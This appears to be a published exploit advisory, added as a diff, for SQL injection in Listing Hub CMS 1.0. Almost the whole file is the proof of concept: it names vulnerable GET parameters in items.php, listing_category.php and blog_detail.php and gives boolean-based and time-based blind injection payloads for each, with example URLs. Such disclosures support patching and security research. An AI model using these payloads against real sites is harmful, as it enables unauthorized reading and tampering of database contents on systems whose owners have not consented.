@@ -1,0 +1,52 @@
+# Exploit Title: Listing Hub CMS 1.0 - Multiple SQL Injection
+# Dork: N/A
+# Date: 27.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/listing-hub-cms-directory-listings-theme/21361294
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : An attacker can use the 'SQLi' attack method on many places.
+====================================================
+
+# PoC : SQLi :
+
+# /items.php Parameter: id (GET)
+
+    Type: boolean-based blind
+    Demo:
+https://site.com/items.php?title=test-listing-1&id=14
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: title=test-listing-1&id=14' AND 4740=4740 AND 'xGsz'='xGsz
+
+    Type: AND/OR time-based blind
+    Demo:
+https://site.com/items.php?title=test-listing-1&id=14
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: title=test-listing-1&id=14' AND SLEEP(5) AND 'FDLK'='FDLK
+
+# /listing_category.php Parameter: city (GET)
+
+    Type: AND/OR time-based blind
+    Demo:
+https://site.com/listing_category.php?keywords=test&city=1&category=1
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: keywords=test&city=1' AND SLEEP(5)-- LTpZ&category=1
+
+    Parameter: category (GET)
+
+    Type: AND/OR time-based blind
+    Demo:
+https://site.com/listing_category.php?keywords=test&city=1&category=1
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: keywords=test&city=1&category=1' AND SLEEP(5)-- LTpZ
+
+# /blog_detail.php Parameter: id (GET)
+
+    Type: AND/OR time-based blind
+    Demo:
+https://site.com/blog_detail.php?title=helping-kids-grow-up-stronger&id=1
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: title=helping-kids-grow-up-stronger&id=1' AND SLEEP(5)-- LTpZ
+
+====================================================
